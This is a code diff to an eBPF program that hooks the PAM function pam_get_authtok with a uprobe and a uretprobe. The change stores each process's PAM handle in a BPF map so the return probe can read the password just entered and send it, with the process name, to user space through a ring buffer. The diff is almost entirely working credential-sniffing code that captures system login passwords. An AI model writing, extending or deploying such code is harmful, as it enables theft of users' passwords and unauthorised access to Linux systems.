@@ -42,15 +42,26 @@ struct
 
 /******************************************************************************/
 /*!
- *  \brief  main userland return probe program
+ *  \brief  bpf hash map use to store pam_handle_t pointer
+ */
+struct {
+    __uint(type       , BPF_MAP_TYPE_HASH);
+    __uint(key_size   , sizeof(uint32_t));
+    __uint(value_size , sizeof(pam_handle_t*));
+    __uint(max_entries, 1024);
+} pam_handle_t_map SEC(".maps");
+
+/******************************************************************************/
+/*!
+ *  \brief  main userland probe program
  *  
  *  int pam_get_authtok(pam_handle_t *pamh, int item,
  *                         const char **authtok, const char *prompt);
  *
  */
 
-SEC("uretprobe/pam_get_authtok")
-int trace_pam_get_authtok(struct pt_regs *ctx)
+SEC("uprobe/pam_get_authtok")
+int get_addr_pam_get_authtok(struct pt_regs *ctx)
 {
   if (!PT_REGS_PARM1(ctx))
     return 0;
@@ -59,6 +70,30 @@ int trace_pam_get_authtok(struct pt_regs *ctx)
 
   // Get current PID to track
   u32 pid = bpf_get_current_pid_tgid() >> 32;
+
+  // Store pam_handle_t pointer in map for later use
+  bpf_map_update_elem(&pam_handle_t_map, &pid, &phandle, BPF_ANY);
+
+  return 0;
+};
+
+SEC("uretprobe/pam_get_authtok")
+int trace_pam_get_authtok(struct pt_regs *ctx)
+{
+  pam_handle_t* phandle = 0;
+
+  // Get current PID to track
+  u32 pid = bpf_get_current_pid_tgid() >> 32;
+
+  // Get pam_handle_t pointer from map
+  void *pam_handle_t_ptr = bpf_map_lookup_elem(&pam_handle_t_map, &pid);
+  if (!pam_handle_t_ptr)
+    return 0;
+
+  bpf_probe_read(&phandle, sizeof(phandle), pam_handle_t_ptr);
+
+  // Delete map entry after use
+  if (bpf_map_delete_elem(&pam_handle_t_map, &pid)) return 0;
 
   // retrieve output parameter
   u64 password_addr = 0;
@@ -77,5 +112,6 @@ int trace_pam_get_authtok(struct pt_regs *ctx)
     bpf_get_current_comm(&e->comm, sizeof(e->comm));
     bpf_ringbuf_submit(e, 0);
   }
+
   return 0;
 };
